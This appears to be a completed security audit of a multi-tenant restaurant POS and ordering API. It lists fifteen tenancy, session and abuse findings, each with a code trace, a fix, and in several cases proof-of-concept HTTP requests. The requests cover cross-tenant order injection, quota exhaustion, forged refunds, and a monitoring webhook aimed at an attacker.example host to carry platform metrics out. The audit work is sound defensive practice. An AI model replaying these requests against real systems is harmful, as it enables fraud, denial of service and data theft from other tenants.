01

What was found

15 validated · sorted by severity

The console's core tenancy model is fundamentally sound. Authentication re-reads the user from the database on every request, role checks fail closed on a blank restaurant, and the entire people-management subsystem plus all order-time money math proved airtight under adversarial validation. The exploitable defects cluster in three recurring shapes.

A fix applied to one file, not its siblings

The register-ownership guard from issue #229 reached registers.ts but never the receipt, refund, shift, or cash-movement routers.

A platform-global resource left owner-writable

Monitoring alert rules, QR templates, and — through a stray body field — coupon ownership were all mutable by an ordinary tenant owner.

A missing comparison on a caller-supplied id

Group-order export and code generation trusted a body/query restaurantId, escalating to a production quota-DoS and real orders injected into another restaurant.

Session lifecycle gaps

A password reset did not revoke sessions, and realtime connections were never re-validated once the socket was open.

⚠ The working tree was being remediated during the audit

A second session applied uncommitted fixes for the coupon, forecast, notification, POS-tenancy, and CSV findings mid-read, and added PosTenantAccessService.ts and admin-dashboard/src/utils/csv.ts. That is why the Fix column first read as a mix of open, partial, and in-progress: it recorded what was observed landing at the moment of the read. Findings are stated against the audited baseline, and cited line numbers are approximate — the concurrent edits shifted some by a few lines.

The Fix column has since been re-verified against the committed code (2026-09-05), and every finding now reads Fixed. Finding 12 is the one worth re-reading: the guard seen mid-audit covered only the shift id, which is why the report recorded an incomplete fix — the aggregate has since been scoped to the shift's restaurant and covered by a real-D1 integration test.

FINDING 01CriticalFixed

Cross-tenant group-order creation → quota-DoS and real-order injection

The staff group-order code generator reads restaurantId from the request body with no comparison to the caller's own restaurant, and it is open to all staff roles (1–4). An attacker at restaurant A creates a group order under restaurant B, bills B's orders.created meter, and — because the response hands back the recovery_code — recovers host control and locks the order into a real order in B's kitchen. Both moduleGate and quotaGate resolve the caller's restaurant, never B.

With QUOTA_ENFORCEMENT_MODE=enforce in production, repeating the call pushes B over its hard limit (100 trial / 1000 basic), so B's genuine POST /orders starts returning 429 — a competitor can lock a rival out of taking orders.

apps/api/src/features/group-orders/routes/index.ts:262 — generateCodeRoute
Attack
http · staff token of restaurant A
POST /api/v1/orders/group/generate-code
Authorization: Bearer <staff_A>   X-CSRF-Token: <t>

{ "restaurantId": "<B_public_id>" }        # billed to B, returns recoveryCode

# then: /join → /recover(recoveryCode) → /cart(B item) → /lock  ⇒ real order in B
Trace
  • entryroutes/index.ts:253 — requireRole([0-4]) + moduleGate + quotaGate, all evaluated on the caller
  • flowroutes/index.ts:262 — restaurantId = body.restaurantId || user.restaurantId, no comparison
  • sinkGroupOrdersService.ts:434 — insert(groupOrders) with restaurant_id=B (no FK); meterEmit bills B
  • sinkGroupOrdersService.ts:1494 — finalize → createOrder({restaurantId:B}) inserts a real order + kitchen broadcast
→Fix: Derive the tenant from the JWT for roles 1–4; reject any body.restaurantId mismatch. Stop returning recovery_code on the staff endpoint. Evaluate the gates against the target restaurant.
FINDING 02HighFixed

POS sibling routers have no tenant-ownership check

Issue #229's requireRegisterOwnership guard was added to registers.ts but never to the receipt, refund, shift, or cash-movement routers. Their handlers pass the raw path id to services that filter on the object id alone — and those tables carry no restaurant_id column. A role 0/1/4 staffer at restaurant A holding a B-owned UUID can close B's active shift, post cash movements to B's ledger, read B's receipts (customer PII + payment), and reprint on B's printer.

Exploitation needs a leaked UUIDv7 — not enumerable, but realistic via former or transferred staff, a shared device, or print-agent host data. The refund/cash-movement approval endpoints are dead code (rows are written pre-completed), so only the create, read, and end paths matter.

Attack

POST /api/v1/pos/shifts/{B_active_shiftId}/cash-movements
{ "type":"cash_out", "amount":999999, "description":"x" }   # auto-approved, unbounded

POST /api/v1/pos/shifts/{B_active_shiftId}/end   { "actualAmount":0 }   # strands B's till
GET  /api/v1/pos/receipts/{B_receiptId}                          # customer PII + payment
Trace
  • entryapp-factory.ts:709 — /pos/* has authMiddleware + moduleGate('pos'); no per-object guard
  • sinkShiftService.ts:142 — endShift matches id + status='active' only; nulls the register's current shift
  • sinkReceiptService.ts:378 — getReceiptDetail returns full content JSON for any receipt id
→Fix: Add an ownership guard to every route, resolving the object's tenant via its register/order (as registers.ts already does). The PosTenantAccessService that appeared mid-audit now guards every object-id route across all four routers.
FINDING 03HighFixed

Refund & receipt-print trust the register / shift headers

The refund-create and receipt-print handlers scope the order to the caller's restaurant, but pass the X-Register-Id and X-Shift-Id headers into the service unchecked. A cashier can book a refund — and a negative cash movement — onto a colleague's or another restaurant's register and active shift. The intra-tenant version needs no leaked secret: sibling register and shift ids are readable from ordinary staff endpoints. Unpaid orders are refundable, because payment_status is never consulted.

Attack
http · forge attribution
POST /api/v1/pos/refunds/create
X-Register-Id: {victim_registerId}     X-Shift-Id: {victim_active_shiftId}

{ "originalOrderId":"{A_order}", "refundType":"full",
  "refundAmount":500, "refundMethod":"cash", "reasonCode":"x" }
Trace
  • entryrefunds.ts:69 — reads X-Register-Id / X-Shift-Id as unvalidated strings
  • flowRefundService.ts:160 — posts a negative approved cash movement onto the named shift
  • sinkReportService.ts:282 — the forged refund lands in the victim's daily report totals
→Fix: Validate the header register (and its shift) belong to the caller's restaurant before processing; validate the header format as a UUID; add a payment_status guard so unpaid orders cannot be refunded.
FINDING 04HighFixed

Monitoring alert rules are platform-global and owner-writable

Alert rules live under a single global KV key with no owner or restaurant field, and every alert route is open to role 1. A tenant owner can enumerate, rewrite, and delete the platform admin's ops and security alert rules (silencing detection with one DELETE); read other tenants' exception messages and request paths — with restaurant and order ids — via GET /alerts/recent; and register a rule whose webhookUrl the platform then fetches, carrying platform-wide metrics to an attacker.

apps/api/src/features/monitoring/services/MonitoringService.ts:91 — ALERT_RULES_KEY = "_alert_rules"
Attack
http · any owner
DELETE /api/v1/monitoring/alerts/rules/<id>      # ops alerting off, platform-wide
GET    /api/v1/monitoring/alerts/recent          # other tenants' error paths + exceptions
POST   /api/v1/monitoring/alerts/rules
  { "metric":"nonexistent.path", "operator":"=", "threshold":0,
    "config":{ "type":"webhook", "webhookUrl":"https://attacker.example/x" } }
Trace
  • entryroutes/index.ts:240 — DELETE /alerts/rules/:id, requireRole([0,1]), no creator check
  • flowMonitoringService.ts:776 — storeRecentAlert writes cross-tenant messages + paths to a global key
  • sinkMonitoringService.ts:1132 — sendWebhookAlert fetches an unvalidated URL with platform metrics
→Fix: Restrict every alert-rule and aggregate route to role 0; give owners a tenant-scoped read view instead. Add an https + host allowlist to the webhook sink and redact paths in the recent-alerts store. Residual: that hardening reached sendWebhookAlert, while sendSlackAlert still issued a bare fetch(webhookUrl), so a rule with type: "slack" took the same egress unchecked — much reduced in scope, since only role 0 can author a rule at all. Closed 2026-09-05: both sinks now pass through a single isWebhookUrlTrusted gate. It exempts only the deployment-configured SLACK_WEBHOOK_URL, matched as a whole string rather than by host — sharing a hostname with the configured endpoint buys nothing — and sends every other URL through the existing allowlist unchanged.
FINDING 05HighFixed

Coupon re-homing into any restaurant via the update endpoint

updateCouponSchema is createCouponSchema.partial(), which keeps the optional restaurantId field. The handler checks ownership against the pre-update row, then forwards the body unchanged, and the UPDATE is keyed on the coupon id alone — no tenant predicate. An owner creates a 100%-off coupon in their own restaurant and re-homes it into a competitor's, where it surfaces in the victim's public coupon list and is honoured down to a zero total.

apps/api/src/features/coupons/schemas/validation.ts:55 · packages/database/src/services/coupon.ts:890
Attack
http · owner of A
POST /api/v1/coupons        { "code":"FREEMEAL", "discountType":"percentage",
                             "discountValue":100, ... }        # → id 42, owned by A
PUT  /api/v1/coupons/42    { "restaurantId":"<B_public_id>" }   # now owned by B
# any customer order at B with FREEMEAL → total 0
Trace
  • entrycoupons/routes/index.ts:269 — ownership checked on the OLD row, body forwarded unmodified
  • flowcoupon.ts:270 — toCouponUpdate strips only money fields; restaurantId passes through
  • sinkcoupon.ts:890 — .set(...).where(eq(coupons.id, id)) — no tenant predicate
→Fix: createCouponSchema.partial().omit({ restaurantId: true }), mirroring the leaves feature. The landed change goes further — updateCouponSchema omits restaurantId and rejects it with z.never(), and toCouponUpdate strips it at the service layer. Residual: updateTemplateSchema in the same feature is still createTemplateSchema.partial() and keeps restaurantId; no route wires it, so it is latent rather than live. Closed 2026-09-05: updateTemplateSchema now omits restaurantId and re-declares it z.never(), the same shape as updateCouponSchema, so the trap is gone before any route is wired to it.
FINDING 06HighFixed

Password reset never revokes sessions

The refresh token carries no version claim, and refreshToken() never checks token_version; neither reset path deactivates the sessions table. After a victim resets their password, an attacker holding a stolen refresh token calls /auth/refresh and receives a fresh access token stamped with the new token_version — the reset does not evict them. changePassword, 200 lines away, does deactivate sessions, so this is an omission, not a design choice. Below industry norm (NIST 800-63B, OWASP ASVS V3.3.4).

packages/database/src/services/VerificationService.ts:355 · auth.ts:451
Attack
post-compromise persistence
# 1. attacker holds victim's __Host-mm_staff_refresh = R0
# 2. victim resets password  → token_version 5→6, sessions row untouched
POST /api/v1/auth/refresh    X-Refresh-Token: R0
# → 200 { token: <new access, tv=6> }  — passes authMiddleware, repeat forever
Trace
  • flowauth.ts:66 — refreshTokenPayload has no tv claim to compare
  • flowVerificationService.ts:355 — reset batch updates password + token_version; sessions untouched
  • sinkauth.ts:472 — mints a new access token with the post-reset token_version
→Fix: Deactivate the user's sessions in both reset paths (as changePassword does). As defence in depth, add a tv claim to the refresh token and compare it in refreshToken.
FINDING 07HighFixed

POST /notifications/send is an arbitrary-HTML mail relay

The recipient-scope check compares the target address to the recipient user's email only when that user has one. An owner creates (or reuses) a puppet staff user with a null email, then sends to any external address. renderTemplate builds a regex from an attacker-supplied data key, so a key of }}|[^]* collapses the whole subject and body — full control of a DKIM-aligned email from notifications@makanmasak.com. High when a mail provider (Resend) is configured, which is the expected production state.

FINDING 09MediumFixed

Any staff can mint an admin-room realtime token

canAccessRoomType lets any role 0–4 request the admin room, and determineRole stamps the token role "admin" regardless of the app role, so a chef receives waiting-list events carrying customer names the kitchen room would not. The order and kitchen payloads are already available in the kitchen room, so the delta is limited. More significantly, the Durable Object validates only at upgrade and never re-checks expiry, role, or restaurant — a demoted or fired platform admin can keep a cross-restaurant admin feed open indefinitely by pinging.

FINDING 10MediumFixed

QR templates are a global table with no ownership check

qr_templates has no restaurant_id column, and the update/delete queries are keyed on the id alone, so any owner can rename, restyle, or soft-delete templates belonging to other restaurants or the platform. The audit log records the actor as "system", not the attacker. The scarier claims were disproved: templates are never consumed by the QR generator, and is_default is unreachable from the API — so this is cross-tenant vandalism of a cosmetic catalogue, not stored injection.

FINDING 11MediumFixed

Unbounded forecast date range hammers the shared database

The forecast schemas cap only the date format and start ≤ end, with no span bound. A multi-decade span materializes one iteration per day, each doing a database join, an upsert, and a KV put, until the ~10,000-subrequest limit ends the request after roughly 3,300 committed days. There is no quota on the feature and forecast_cache is never purged. Because D1 is single-writer and shared across tenants, the amplification contends on the primary serving everyone. (The extreme 1000–9999 span instead runs out of isolate memory with zero writes.)

apps/api/src/features/forecast/schemas/validation.ts:8 · ForecastService.ts:669
Attack
http · owner
POST /api/v1/forecast/<own-rid>/generate
{ "startDate":"2026-01-01", "endDate":"2056-01-01", "type":"item_level" }
# → ~3,300 forecast_cache rows + KV keys, contention on the shared primary
→Fix: Cap the span in the schema and clamp inside getDateRange; add a forecast quota, a [limits] subrequest cap, and a scheduled purge of expired cache rows.

generateShiftReport aggregated the orders table with no restaurant_id predicate. At the baseline the endpoint returned HTTP 400 because it bound Date objects raw into a sql template (D1_TYPE_ERROR), so nothing leaked. During the audit a requireShift guard was added and the route test updated to assert it — but that guarded the shift id, not the unscoped aggregate, which left every cashier one Date-binding fix away from platform-wide revenue, volume, and payment-mix.

FINDING 14MediumFixed

Cancelling taken leave refunds the balance

cancelLeaveRequest allows cancelling an approved request and restores usedDays by its total, guarded only by an existence check — with no comparison of the leave dates to today. An employee requests paid leave over dates already in the past, has it approved, takes the days, then cancels their own request to refund the balance, and repeats. The schedules auto-cancelled at approval are not restored, so the abuse leaves no roster trace.

packages/database/src/services/LeaveService.ts:1427 — cancelLeaveRequest
Attack
http · employee
# balance total 14 / used 0
# request 5 past days → approve (used 5) → take leave
POST /api/v1/leaves/requests/<own_approved>/cancel   { "reason":"x" }
# → used 0, remaining 14 again; repeat for unlimited paid days off
→Fix: Reject cancellation of an approved request whose leave has already started or finished (only refund when startDate is in the future).
FINDING 15LowFixed

Guest orders bypass the coupon per-user limit

assertCouponRedeemable gates the per-user usage check on the presence of a userId, but guest orders carry none — so a coupon with a per-user limit but no global cap can be redeemed by guests without limit. The only authoritative cap is the global usageLimit, enforced atomically by claimUsageSlot.

packages/database/src/services/coupon.ts:457 — assertCouponRedeemable
→Fix: For guest orders, key the per-user check on a stable guest identifier (phone), or reject redemption when a per-user limit is set but there is no global cap and no identity.
03

What holds up

validated, not assumed

These areas were probed adversarially and survived. They are the reason the findings above read as isolated gaps rather than a systemic weakness.

✓ People-management access control

Every scheduling, leave, and user route threads a caller-derived tenant scope into its SQL. "Act on behalf of employeeId" writes verify the target's restaurant; mass assignment is blocked by schema key-stripping; deactivation revokes.

✓ Order-time money math

Unit prices are recomputed server-side from the catalog; option choices resolve against the item's own catalog; discounts floor at zero; min-order is checked pre-discount. No negative-total or overflow path survived.

✓ Order state machine & inventory

Cancellation uses a version compare-and-set with a rollback sentinel; terminal states have no out-edges; delivered and paid orders are not cancellable; null inventory is preserved on restore.

✓ Auth & crypto plumbing

Billing-webhook idempotency, subscription cache invalidation, print-agent job scoping, and the token-blacklist namespaces all checked out. jsonwebtoken cannot be tricked into alg:none. No secrets in the tree.
